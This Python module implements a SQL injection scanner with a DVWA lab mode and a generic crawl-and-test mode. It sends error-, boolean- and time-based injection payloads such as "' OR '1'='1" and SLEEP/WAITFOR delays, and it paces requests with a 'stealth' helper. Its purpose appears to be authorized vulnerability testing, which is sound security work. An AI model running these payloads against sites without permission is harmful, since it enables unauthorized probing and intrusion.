# scanners/sqli_scanner.py
import requests, time
from bs4 import BeautifulSoup
from core.web_crawler import WebCrawler
from llm.payload_generator import LLMPayloadGenerator
from core.authorization import AuthorizationChecker
from core.stealth import stealth

class SQLiScanner:
    DVWA_PATHS = ["/vulnerabilities/sqli/", "/vulnerabilities/sqli_blind/"]

    def __init__(self, target_url, session=None):
        self.target_url = target_url.rstrip("/")
        self.session = session or requests.Session()
        self.payload_gen = LLMPayloadGenerator()
        self.auth = AuthorizationChecker()
        self.findings = []
        self.is_dvwa = "dvwa" in target_url.lower()
        self._crawler = None
        self._pre_crawled = False
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner - Authorized Testing)"})
        self.error_patterns = [
            "you have an error in your sql syntax","warning: mysql",
            "unclosed quotation mark","sql syntax","mysql_fetch",
            "mysqli_fetch","division by zero","sqlite","ora-01756",
            "microsoft ole db","quoted string not properly terminated",
        ]

    def check_error(self, r):
        if not r: return False
        t = r.text.lower()
        for p in self.error_patterns:
            if p in t: return p
        return False

    def get_token(self, url):
        try:
            stealth.wait()
            r = self.session.get(url, timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            t = soup.find("input", {"name": "user_token"})
            return t["value"] if t else ""
        except: return ""

    def _scan_dvwa(self):
        print("[SQLi] DVWA mode")
        error_payloads = ["'", "1'", "' OR '1'='1", '"']
        for path in self.DVWA_PATHS:
            url = self.target_url + path
            # Error-based
            for payload in error_payloads:
                token = self.get_token(url)
                stealth.wait()
                r = self.session.get(url, params={"id": payload, "Submit": "Submit", "user_token": token}, timeout=10)
                err = self.check_error(r)
                if err:
                    self.findings.append({"type": "SQL Injection - Error Based", "url": url, "parameter": "id", "payload": payload, "severity": "Critical", "evidence": f"SQL error: '{err}'"})
                    print(f"[SQLi] ✅ Error-Based!")
                    break
            # Boolean-based
            t1 = self.get_token(url)
            stealth.wait()
            r1 = self.session.get(url, params={"id": "1' OR '1'='1", "Submit": "Submit", "user_token": t1}, timeout=10)
            t2 = self.get_token(url)
            stealth.wait()
            r2 = self.session.get(url, params={"id": "1' OR '1'='2", "Submit": "Submit", "user_token": t2}, timeout=10)
            if r1 and r2 and abs(len(r1.text) - len(r2.text)) > 50:
                self.findings.append({"type": "SQL Injection - Boolean Based", "url": url, "parameter": "id", "payload": "1' OR '1'='1 vs 1' OR '1'='2", "severity": "Critical", "evidence": f"Response diff: {abs(len(r1.text)-len(r2.text))} chars"})
                print(f"[SQLi] ✅ Boolean-Based!")
            # Time-based
            print("[SQLi] Time-based test (~3s)...")
            token = self.get_token(url)
            start = time.time()
            stealth.wait()
            self.session.get(url, params={"id": "1' AND SLEEP(3)-- -", "Submit": "Submit", "user_token": token}, timeout=15)
            if time.time() - start >= 3:
                self.findings.append({"type": "SQL Injection - Time Based Blind", "url": url, "parameter": "id", "payload": "1' AND SLEEP(3)-- -", "severity": "Critical", "evidence": f"Response delayed {round(time.time()-start,2)}s"})
                print(f"[SQLi] ✅ Time-Based!")

    def _test_endpoint(self, get_fn, param_name, endpoint_url, error_payloads):
        # Error-based
        for payload in error_payloads:
            r = get_fn(payload)
            err = self.check_error(r)
            if err:
                self.findings.append({"type": "SQL Injection - Error Based", "url": endpoint_url, "parameter": param_name, "payload": payload, "severity": "Critical", "evidence": f"SQL error: '{err}'"})
                print(f"[SQLi] ✅ Error-Based! Param: {param_name}")
                return
        # Boolean-based
        r1 = get_fn("1' OR '1'='1")
        time.sleep(0.3)
        r2 = get_fn("1' OR '1'='2")
        if r1 and r2 and abs(len(r1.text) - len(r2.text)) > 50:
            self.findings.append({"type": "SQL Injection - Boolean Based", "url": endpoint_url, "parameter": param_name, "payload": "1' OR '1'='1 vs 1' OR '1'='2", "severity": "Critical", "evidence": f"Diff: {abs(len(r1.text)-len(r2.text))} chars"})
            print(f"[SQLi] ✅ Boolean-Based! Param: {param_name}")
        # Time-based
        print(f"[SQLi] Time-based on '{param_name}' (~3s)...")
        for tp in ["1' AND SLEEP(3)-- -", "1; WAITFOR DELAY '0:0:3'--"]:
            start = time.time()
            get_fn(tp)
            if time.time() - start >= 3:
                self.findings.append({"type": "SQL Injection - Time Based Blind", "url": endpoint_url, "parameter": param_name, "payload": tp, "severity": "Critical", "evidence": f"Delayed {round(time.time()-start,2)}s"})
                print(f"[SQLi] ✅ Time-Based! Param: {param_name}")
                break

    def _scan_generic(self):
        print("[SQLi] Generic mode")
        if self._pre_crawled and self._crawler:
            crawler = self._crawler
            forms = crawler.forms_found
            url_params = crawler.url_params_found
        else:
            crawler = WebCrawler(self.target_url, self.session, max_pages=15)
            crawler.crawl()
            forms = crawler.forms_found
            url_params = crawler.url_params_found

        print(f"[SQLi] {len(forms)} forms, {len(url_params)} URL param endpoints")
        error_payloads = ["'", '"', "1'", "' OR '1'='1"]

        # Test forms
        tested = set()
        for form in forms:
            action = form["action_url"]
            if action in tested: continue
            tested.add(action)
            text_params = [i["name"] for i in form["inputs"] if i["type"] in ["text","search","email","url","textarea","password","number"]]
            for param in text_params:
                self._test_endpoint(lambda p, f=form, pn=param: crawler.submit_form(f, p, target_param=pn), param, action, error_payloads)

        # Test URL params — KEY for real websites
        tested_bases = set()
        for up in url_params:
            base = up["base_url"]
            if base in tested_bases: continue
            tested_bases.add(base)
            print(f"[SQLi] Testing URL params at: {base} | {list(up['params'].keys())}")
            for param_name in up["params"]:
                self._test_endpoint(lambda p, u=up, pn=param_name: crawler.test_url_param(u, p, pn), param_name, base, error_payloads)

    def scan(self):
        if not self.auth.check_authorization(self.target_url):
            print("[SQLi] ❌ Unauthorized!"); return []
        print(f"\n[SQLi] 🔍 Scanning: {self.target_url}")
        if self.is_dvwa: self._scan_dvwa()
        else: self._scan_generic()
        print(f"\n[SQLi] Done. Found {len(self.findings)} finding(s).")
        return self.findings